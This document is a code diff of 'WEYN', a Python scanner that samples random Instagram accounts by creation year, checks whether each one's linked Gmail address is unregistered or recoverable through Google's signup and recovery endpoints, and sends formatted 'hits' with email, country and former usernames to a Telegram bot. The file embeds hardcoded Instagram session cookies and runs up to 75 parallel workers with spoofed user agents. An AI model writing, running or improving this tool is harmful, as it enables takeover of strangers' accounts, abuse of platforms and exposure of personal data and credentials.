@@ -16,12 +16,8 @@ import secrets
 from colorama import Fore, Style, init
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from itertools import cycle
+import hashlib
 import httpx
-
-try:
-    import telebot as _telebot_mod
-except ImportError:
-    _telebot_mod = None
 
 init(autoreset=True)
 
@@ -36,15 +32,15 @@ B     = Style.BRIGHT
 
 ID_RANGES = [
     (1,           100000000,  2010),
-    (100000001,   500000000,  2011),
-    (500000001,   1100000000, 2012),
-    (1100000001,  1800000000, 2013),
-    (1800000001,  2500000000, 2014),
-    (2500000001,  3200000000, 2015),
+    (100000001,   279760000,  2011),
+    (279760001,   900990000,  2012),
+    (900990001,   1629010000, 2013),
+    (1629010001,  2400000000, 2014),
+    (2400000001,  3200000000, 2015),
     (3200000001,  3900000000, 2016),
-    (3900000001,  4600000000, 2017),
-    (4600000001,  5400000000, 2018),
-    (5400000001,  6500000000, 2019),
+    (3900000001,  4500000000, 2017),
+    (4500000001,  5000000000, 2018),
+    (5000000001,  6000000000, 2019),
 ]
 
 def gdate(user_id):
@@ -57,12 +53,12 @@ def gdate(user_id):
     except Exception:
         return 2019
 
-# ── Unified hits file ──
+# ── Hits file ──
 HITS_FILE       = "weyn_hits.txt"
 _hits_file_lock = Lock()
 
 def _write_session_separator(method_num):
-    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     sep = (
         "\n" +
         "═" * 54 + "\n" +
@@ -90,12 +86,13 @@ def _register_session(s):
 def close_all_sessions():
     with _active_sessions_lock:
         for s in _active_sessions:
-            try: s.close()
-            except Exception: pass
+            try:
+                s.close()
+            except Exception:
+                pass
         _active_sessions.clear()
 
 def _send_telegram(token, chat_id, text):
-    """Send a Telegram message. Stores the last result in _web_state for UI visibility."""
     try:
         resp = requests.post(
             f"https://api.telegram.org/bot{token}/sendMessage",
@@ -122,7 +119,17 @@ def get_year_range(year_choice):
             return lower, upper
     return 1, 6000000000
 
-def format_hit(hit_num, username, email, followers, following, bio, year_label, reset_text, join_date, country):
+# ── WEYN hit message format (retained) ──
+def format_hit(hit_num, username, email, followers, following, bio,
+               year_label, reset_text, join_date, country,
+               masked=None, former=None):
+    about_lines = (
+        f"│  𝐉𝐨𝐢𝐧𝐞𝐝     ➤  {join_date}\n"
+        f"│  𝐘𝐞𝐚𝐫       ➤  {year_label}\n"
+        f"│  𝐂𝐨𝐮𝐧𝐭𝐫𝐲    ➤  {country}\n"
+        f"│  𝐅𝐨𝐫𝐦𝐞𝐫     ➤  {former or '-'}\n"
+    )
+    masked_line = f"│  𝐌𝐚𝐬𝐤𝐞𝐝     ➤  {masked}\n" if masked else ""
     return f"""
 ╔═━━━────────────━━━═╗
         WEYN IG HIT #{hit_num}
@@ -137,6 +144,9 @@ def format_hit(hit_num, username, email, followers, following, bio, year_label, 
 │  𝐁𝐢𝐨        ➤  {bio}
 │  𝐑𝐞𝐬𝐞𝐭      ➤  {reset_text}
 │
+├──〔 𝐀𝐁𝐎𝐔𝐓 𝐓𝐇𝐈𝐒 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 〕───────────┤
+│
+{about_lines}{masked_line}│
 ├──〔 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐋𝐈𝐍𝐊 〕──────────────────┤
 │
 │  https://www.instagram.com/{username}
@@ -144,94 +154,22 @@ def format_hit(hit_num, username, email, followers, following, bio, year_label, 
 ╰──────────────────────────────────────╯
 """
 
-def show_weyn_banner():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""{C}{B}
- ██╗    ██╗███████╗██╗   ██╗███╗   ██╗
- ██║    ██║██╔════╝╚██╗ ██╔╝████╗  ██║
- ██║ █╗ ██║█████╗   ╚████╔╝ ██╔██╗ ██║
- ██║███╗██║██╔══╝    ╚██╔╝  ██║╚██╗██║
- ╚███╔███╔╝███████╗   ██║   ██║ ╚████║
-  ╚══╝╚══╝ ╚══════╝   ╚═╝   ╚═╝  ╚═══╝
-{RESET}{M}{B}          ◈  T O O L S  ◈{RESET}
-""")
-
-def ask_year():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    available = [str(y) for _, _, y in ID_RANGES]
-    print(f"\n{C}{B}╔═━━━────────────━━━═╗")
-    print(f"      YEAR FILTER")
-    print(f"╚═━━━────────────━━━═╝{RESET}")
-    print(f"\n{W}  Available: {Y}{', '.join(available)}{RESET}")
-    print(f"{W}  Enter a year or press {Y}Enter{W} for all (2010–2019): {C}", end="")
-    raw = input().strip()
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(RESET, end="")
-    if not raw:
-        print(f"{G}  → Running all years (2010–2019){RESET}\n")
-        return None
-    try:
-        year = int(raw)
-        if year in [y for _, _, y in ID_RANGES]:
-            print(f"{G}  → Year locked to {year}{RESET}\n")
-            return year
-        else:
-            print(f"{R}  Invalid year. Using all years.{RESET}\n")
-            return None
-    except Exception:
-        print(f"{R}  Invalid input. Using all years.{RESET}\n")
-        return None
-
-def ask_min_followers():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"\n{C}{B}╔═━━━────────────━━━═╗")
-    print(f"   MIN FOLLOWERS FILTER")
-    print(f"╚═━━━────────────━━━═╝{RESET}")
-    print(f"{W}  Enter minimum followers or press {Y}Enter{W} to skip: {C}", end="")
-    raw = input().strip()
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(RESET, end="")
-    if not raw:
-        print(f"{G}  → No follower filter{RESET}\n")
-        return 0
-    try:
-        n = int(raw)
-        if n > 0:
-            print(f"{G}  → Minimum followers: {n}{RESET}\n")
-            return n
-    except Exception:
-        pass
-    print(f"{G}  → No follower filter{RESET}\n")
-    return 0
-
-
-def show_menu():
-    show_weyn_banner()
-    print(f"{C}{B}╔══════════════════════════════════════╗")
-    print(f"║          S E L E C T  M E T H O D   ║")
-    print(f"╠══════════════════════════════════════╣")
-    print(f"║  {W}[1]{C}  Method 1                        ║")
-    print(f"║  {W}[0]{C}  Exit                            ║")
-    print(f"╚══════════════════════════════════════╝{RESET}")
-    print(f"\n{M}  ➤ {RESET}", end="")
-    return input().strip()
-
 
 # ══════════════════════════════════════════════════════════
-#  METHOD 1
+#  METHOD 1 — STATE & COUNTERS
 # ══════════════════════════════════════════════════════════
 
-_m1_hits            = 0
-_m1_bad_insta       = 0
-_m1_bad_email       = 0
-_m1_good_insta      = 0
-_m1_total           = 0
-_m1_taken           = 0
-_m1_limit           = 0
-_m1_scanned         = 0
-_m1_found_emails    = []
-_m1_found_lock      = Lock()
-_m1_hit_lock        = Lock()
+_m1_hits         = 0
+_m1_bad_insta    = 0
+_m1_bad_email    = 0
+_m1_good_insta   = 0
+_m1_total        = 0
+_m1_taken        = 0
+_m1_limit        = 0
+_m1_scanned      = 0
+_m1_found_emails = []
+_m1_found_lock   = Lock()
+_m1_hit_lock     = Lock()
 
 _web_state = {
     'running': False, 'method': None,
@@ -242,6 +180,7 @@ _web_state = {
 }
 _web_lock = Lock()
 
+# ── Session pool for "About This Account" ──
 _m1_ABOUT_SESSION_INDEX = 0
 _m1_ABOUT_SESSION_LOCK  = Lock()
 _m1_ABOUT_SESSION_ID    = ""
@@ -258,20 +197,20 @@ _m1_session  = requests.Session()
 _m1__session = requests.Session()
 
 HARDCODED_SESSIONS = [
-{
-  "csrftoken": "SA7WOqODWLd9lq8tepS9lO5hEyQiiAjf",
-  "mid": "acXucwABAAEpLL9LTj_zE5mdFUm4",
-  "ig_did": "68B3C797-5435-4284-91DF-36BB57ACE8EC",
-  "sessionid": "37980233613%3AzkmZM0x4USstRi%3A13%3AAYgWd5cwudKpm1w0dyEb0AD6LFdG2zY5HVncDeFJfA",
-  "ds_user_id": "37980233613"
-},
-{
-  "csrftoken": "tPvqXDZm6bD62k-_0a2rRl",
-  "mid": "acVQKgABAAHxWQ3ymupl3SPVKxqV",
-  "ig_did": "02AD7E3A-B843-43E2-B5BD-520BA7392ACA",
-  "sessionid": "74090320231%3ACtvz4lnFouLKGZ%3A25%3AAYg8Be6H6r7-c9Vz5Jhewf-KhM-nvusIhXYYRBqZUw",
-  "ds_user_id": "74090320231"
-}
+    {
+        "csrftoken": "SA7WOqODWLd9lq8tepS9lO5hEyQiiAjf",
+        "mid": "acXucwABAAEpLL9LTj_zE5mdFUm4",
+        "ig_did": "68B3C797-5435-4284-91DF-36BB57ACE8EC",
+        "sessionid": "37980233613%3AzkmZM0x4USstRi%3A13%3AAYgWd5cwudKpm1w0dyEb0AD6LFdG2zY5HVncDeFJfA",
+        "ds_user_id": "37980233613"
+    },
+    {
+        "csrftoken": "tPvqXDZm6bD62k-_0a2rRl",
+        "mid": "acVQKgABAAHxWQ3ymupl3SPVKxqV",
+        "ig_did": "02AD7E3A-B843-43E2-B5BD-520BA7392ACA",
+        "sessionid": "74090320231%3ACtvz4lnFouLKGZ%3A25%3AAYg8Be6H6r7-c9Vz5Jhewf-KhM-nvusIhXYYRBqZUw",
+        "ds_user_id": "74090320231"
+    }
 ]
 
 _M1_VIP_CONFIG = {
@@ -327,6 +266,8 @@ _M1_UA_WEB        = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTM
 _M1_UA_APP        = "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)"
 
 
+# ── About-session helpers ──
+
 def _m1_build_cookie_str(s):
     return (
         f"csrftoken={s['csrftoken']}; "
@@ -367,16 +308,17 @@ def _m1_about_refresh_tokens(cookie_str=None, username="instagram"):
                 "Accept-Encoding": "gzip, deflate",
                 "Cookie": _cookie,
                 "Referer": "https://www.instagram.com/",
-            }
+            },
+            timeout=10
         )
-        html = resp.text
-        m      = re.search(r'"f":"([^"]+)"', html)
-        m2     = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
-        m3     = re.search(r'"server_revision":(\d+)', html)
-        m4     = re.search(r'__bkv=([a-f0-9]{40,})', html)
-        m5     = re.search(r'"hsi":"([^"]+)"', html)
-        dyn_m  = re.search(r'"__dyn":"([^"]+)"', html)
-        csr_m  = re.search(r'"__csr":"([^"]+)"', html)
+        html  = resp.text
+        m     = re.search(r'"f":"([^"]+)"', html)
+        m2    = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
+        m3    = re.search(r'"server_revision":(\d+)', html)
+        m4    = re.search(r'__bkv=([a-f0-9]{40,})', html)
+        m5    = re.search(r'"hsi":"([^"]+)"', html)
+        dyn_m = re.search(r'"__dyn":"([^"]+)"', html)
+        csr_m = re.search(r'"__csr":"([^"]+)"', html)
         with _m1_about_token_lock:
             if m:     _m1_about_tokens["fb_dtsg"] = m.group(1)
             if m2:    _m1_about_tokens["lsd"]     = m2.group(1)
@@ -440,7 +382,7 @@ def _m1_try_get_about(user_id, username):
             "sec-fetch-dest": "empty",
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "same-origin",
-        }, data=urllib.parse.urlencode(post_params))
+        }, data=urllib.parse.urlencode(post_params), timeout=10)
         raw = resp.text
         if raw.startswith("for (;;);"):
             raw = raw[9:]
@@ -488,6 +430,9 @@ def _m1_get_about_account(user_id, username):
     except Exception:
         pass
     return result
+
+
+# ── Instagram email check ──
 
 def _m1_rest_web_check_email(email):
     try:
@@ -592,7 +537,7 @@ def _m1_rest_bloks_v2(email):
         'x-pigeon-session-id': f"UFS-{uid4_4}-0",
     }
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=8)
+        response = requests.post(url, data=payload, headers=headers, timeout=20)
         if email in response.text:
             return email
         elif 'SOMETHING, GOT F3CKED' in response.text:
@@ -833,8 +778,10 @@ def _m1_get_country_flag(country_name):
             return flags[key]
     return ""
 
+
+# ── Google token helpers ──
+
 def _m1_gtokens_background():
-    """Periodically regenerate tokens.txt so the TL token never expires mid-scan."""
     time.sleep(60)
     while True:
         try:
@@ -884,14 +831,6 @@ def _m1_get_tl_background():
             pass
         time.sleep(120)
 
-def _m1_cinstagram(email, token, chat_id, user, loc_session):
-    global _m1_good_insta, _m1_bad_insta
-    if _m1_lookup_instagram(email):
-        _m1_good_insta += 1
-        _m1_cgmail(email, token, chat_id, user, loc_session)
-    else:
-        _m1_bad_insta += 1
-
 def _m1_gtokens():
     max_retries = 2
     endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
@@ -910,7 +849,10 @@ def _m1_gtokens():
             res1 = requests.get(f"{_M1_CONFIG['google_url']}{endpoint}", headers=hdrs)
             if res1.status_code != 200:
                 continue
-            tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
+            tok = re.search(
+                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
+                res1.text
+            )
             if not tok:
                 continue
             tl = tok.group(2)
@@ -949,7 +891,7 @@ def _m1_gtokens():
             'x-same-domain': '1'
         }
         params2 = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
-        em2  = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
+        em2   = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
         data2 = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{em2}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
         resp2 = requests.post(
             'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
@@ -965,6 +907,9 @@ def _m1_gtokens():
     except Exception:
         pass
     return False
+
+
+# ── Core scanning functions ──
 
 def _m1_save_hit(username, user, token, chat_id):
     global _m1_hits, _m1_total, _m1_found_emails
@@ -983,6 +928,8 @@ def _m1_save_hit(username, user, token, chat_id):
         country_nm = about.get("country") or "-"
         country_fl = _m1_get_country_flag(country_nm)
         country    = f"{country_nm} {country_fl}".strip() if country_fl else country_nm
+        former_raw = about.get("former_usernames", [])
+        former     = ", ".join(former_raw) if former_raw else "-"
         masked, has_phone = _m1_get_masked(username)
         if has_phone:
             return
@@ -1004,17 +951,23 @@ def _m1_save_hit(username, user, token, chat_id):
             reset_text = reset_text,
             join_date  = join_date,
             country    = country,
+            masked     = masked,
+            former     = former,
         )
         with _m1_found_lock:
             if email_str not in _m1_found_emails:
                 _m1_found_emails.append(email_str)
         _send_telegram(token, chat_id, output)
         _save_hit_to_file(output)
+        with _web_lock:
+            _web_state['hits']  = _m1_hits
+            _web_state['total'] = _m1_total
 
 def _m1_cgmail(email, token, chat_id, user, loc_session):
     global _m1_bad_email, _m1_taken
     try:
         usr = email.split('@')[0] if '@' in email else email
+        # Method 1: tokens.txt TL
         try:
             with open(_M1_CONFIG["token_file"], 'r') as f:
                 line = f.read().splitlines()[0]
@@ -1047,6 +1000,7 @@ def _m1_cgmail(email, token, chat_id, user, loc_session):
                 return
         except Exception:
             pass
+        # Method 2: google.txt TL
         try:
             with open("google.txt", "r") as ys:
                 tl2 = ys.read().strip()
@@ -1085,23 +1039,13 @@ def _m1_cgmail(email, token, chat_id, user, loc_session):
     except Exception:
         _m1_bad_email += 1
 
-def _m1_stats():
-    while True:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        show_weyn_banner()
-        print(f"""
-{C}{B}╭──────────────────────────────────────────────╮
-│  SCANNING                              │
-├──────────────────────────────────────────────┤
-{G}{B}│  HITS FOUND    ➞  {W}{B}{_m1_hits}{RESET}
-{G}{B}│  GOOD INSTA    ➞  {W}{B}{_m1_good_insta}{RESET}
-{R}{B}│  BAD INSTA     ➞  {W}{B}{_m1_bad_insta}{RESET}
-{R}{B}│  BAD EMAIL     ➞  {W}{B}{_m1_bad_email}{RESET}
-{Y}{B}│  TAKEN GMAIL   ➞  {W}{B}{_m1_taken}{RESET}
-{Y}{B}│  LIMIT HITS    ➞  {W}{B}{_m1_limit}{RESET}
-{C}{B}╰──────────────────────────────────────────────╯
-{RESET}""")
-        time.sleep(0.3)
+def _m1_cinstagram(email, token, chat_id, user, loc_session):
+    global _m1_good_insta, _m1_bad_insta
+    if _m1_lookup_instagram(email):
+        _m1_good_insta += 1
+        _m1_cgmail(email, token, chat_id, user, loc_session)
+    else:
+        _m1_bad_insta += 1
 
 def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None):
     loc_session = _register_session(requests.Session())
@@ -1109,9 +1053,16 @@ def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None)
         try:
             user_id    = random.randrange(min_id, max_id)
             rnd        = str(random.randint(2500000000, 21254029834))
-            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"][random.randint(0,5)] + "; " + str(random.randint(100,1300)) + "dpi; " + str(random.randint(200,2000)) + "x" + str(random.randint(200,2000)) + "; " + ["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"][random.randint(0,11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999)) + ")"
-            lsd        = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(16))
-            headers    = {
+            user_agent = (
+                "Instagram 311.0.0.32.118 Android ("
+                + ["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"][random.randint(0,5)]
+                + "; " + str(random.randint(100,1300)) + "dpi; "
+                + str(random.randint(200,2000)) + "x" + str(random.randint(200,2000)) + "; "
+                + ["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"][random.randint(0,11)]
+                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999)) + ")"
+            )
+            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(16))
+            headers = {
                 'accept': '*/*', 'accept-language': 'en,en-US;q=0.9',
                 'content-type': 'application/x-www-form-urlencoded',
                 'dnt': '1', 'origin': 'https://www.instagram.com',
@@ -1131,7 +1082,7 @@ def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None)
             }
             global _m1_scanned
             _m1_scanned += 1
-            resp = loc_session.post(_M1_CONFIG["insta_graphql"], headers=headers, data=data, timeout=5)
+            resp = loc_session.post(_M1_CONFIG["insta_graphql"], headers=headers, data=data, timeout=10)
             if resp.status_code == 429:
                 time.sleep(1)
                 continue
@@ -1154,123 +1105,69 @@ def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None)
             time.sleep(0.05)
             continue
 
-def run_method1(year_choice, min_followers=0):
-    global _m1_hits, _m1_bad_insta, _m1_bad_email, _m1_good_insta
-    global _m1_total, _m1_taken, _m1_limit, _m1_found_emails, _m1_scanned
-    _m1_hits = _m1_bad_insta = _m1_bad_email = _m1_good_insta = 0
-    _m1_total = _m1_taken = _m1_limit = _m1_scanned = 0
-    _m1_found_emails = []
-
-    if year_choice is not None:
-        _M1_VIP_CONFIG["vip_date_min"] = year_choice
-        _M1_VIP_CONFIG["vip_date_max"] = year_choice
-    else:
-        _M1_VIP_CONFIG["vip_date_min"] = 2010
-        _M1_VIP_CONFIG["vip_date_max"] = 2019
-
-    min_id, max_id = get_year_range(year_choice)
-
-    TOKEN = input(f"\n{C}{B}╔═══─────═══╗\n      ENTER BOT TOKEN\n╚═══─────═══╝\n{M}         ➞ {RESET}").strip()
-    os.system('cls' if os.name == 'nt' else 'clear')
-    if not TOKEN:
-        print(f"{R}  Bot token is empty. Aborting.{RESET}")
-        return
-
-    CHAT_ID = input(f"\n{C}{B}╔═══─────═══╗\n        ENTER CHAT ID\n╚═══─────═══╝\n{M}         ➞ {RESET}").strip()
-    os.system('cls' if os.name == 'nt' else 'clear')
-    if not CHAT_ID:
-        print(f"{R}  Chat ID is empty. Aborting.{RESET}")
-        return
-
-    print(f"\n{G}{B}  Starting... wait ~30 seconds{RESET}")
-    print(f"{Y}  ↩  Double ENTER → back to menu{RESET}\n")
-
-    stop_event_m1 = Event()
-    def _listen_m1():
-        input()
-        print(f"\n{Y}{B}  ↩  Press ENTER again to confirm...{RESET}", end="", flush=True)
-        input()
-        stop_event_m1.set()
-    Thread(target=_listen_m1, daemon=True).start()
-
-    _m1_next_about_session()
-    _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
-    Thread(target=_m1_about_token_refresher, daemon=True).start()
-    Thread(target=_m1_get_tl_background,     daemon=True).start()
-    Thread(target=_m1_stats,                 daemon=True).start()
-
-    _m1_gtokens()
-
-    MAX_WORKERS = 500
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        futures = [executor.submit(_m1_sinsta, min_id, max_id, TOKEN, CHAT_ID, min_followers, stop_event_m1) for _ in range(MAX_WORKERS)]
-        try:
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception:
-                    pass
-        except KeyboardInterrupt:
-            print(f"\n{R}{B}  Interrupted. Returning to menu...{RESET}")
-            executor.shutdown(wait=False, cancel_futures=True)
-
 
 # ══════════════════════════════════════════════════════════
-#  MAIN
+#  WEB ENTRY POINT  (called by app.py)
 # ══════════════════════════════════════════════════════════
 
 def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
     global _m1_hits, _m1_bad_insta, _m1_bad_email, _m1_good_insta
     global _m1_total, _m1_taken, _m1_limit, _m1_found_emails, _m1_scanned
+
+    # Reset all counters
     _m1_hits = _m1_bad_insta = _m1_bad_email = _m1_good_insta = 0
     _m1_total = _m1_taken = _m1_limit = _m1_scanned = 0
     _m1_found_emails = []
+
     _write_session_separator(1)
-    _web_state.update({'running': True, 'method': '1', 'hits': 0, 'good': 0,
-                       'bad_insta': 0, 'bad_email': 0, 'taken': 0, 'limit': 0,
-                       'total': 0, 'verified': 0, 'recent_hits': []})
+    _web_state.update({
+        'running': True, 'method': '1',
+        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
+        'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
+        'recent_hits': [], 'tg_status': '', 'tg_error': '',
+    })
+
     if year_choice is not None:
         _M1_VIP_CONFIG["vip_date_min"] = year_choice
         _M1_VIP_CONFIG["vip_date_max"] = year_choice
     else:
         _M1_VIP_CONFIG["vip_date_min"] = 2010
         _M1_VIP_CONFIG["vip_date_max"] = 2019
+
     min_id, max_id = get_year_range(year_choice)
+
+    # Start background helpers
     _m1_next_about_session()
     _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
     Thread(target=_m1_about_token_refresher, daemon=True).start()
     Thread(target=_m1_get_tl_background,     daemon=True).start()
     Thread(target=_m1_gtokens_background,    daemon=True).start()
+
+    # Initial token fetch
     _m1_gtokens()
+
     NUM_WORKERS = 75
-    while not stop_event.is_set():
-        with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
-            futures = [executor.submit(_m1_sinsta, min_id, max_id, token, chat_id, min_followers, stop_event) for _ in range(NUM_WORKERS)]
-            for future in as_completed(futures):
-                try: future.result()
-                except Exception: pass
-        if not stop_event.is_set():
-            time.sleep(0.5)
-    _web_state['running'] = False
+    try:
+        while not stop_event.is_set():
+            with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
+                futures = [
+                    executor.submit(_m1_sinsta, min_id, max_id, token, chat_id, min_followers, stop_event)
+                    for _ in range(NUM_WORKERS)
+                ]
+                for future in as_completed(futures):
+                    try:
+                        future.result()
+                    except Exception:
+                        pass
+            if not stop_event.is_set():
+                time.sleep(0.5)
+    finally:
+        _web_state['running'] = False
 
 
 def main():
-    while True:
-        choice = show_menu()
+    pass
 
-        if choice == '0':
-            show_weyn_banner()
-            print(f"{M}{B}  Goodbye.{RESET}\n")
-            sys.exit(0)
-
-        elif choice == '1':
-            year_choice   = ask_year()
-            min_followers = ask_min_followers()
-            run_method1(year_choice, min_followers)
-
-        else:
-            print(f"{R}  Invalid choice. Try again.{RESET}")
-            time.sleep(1)
 
 if __name__ == "__main__":
     main()
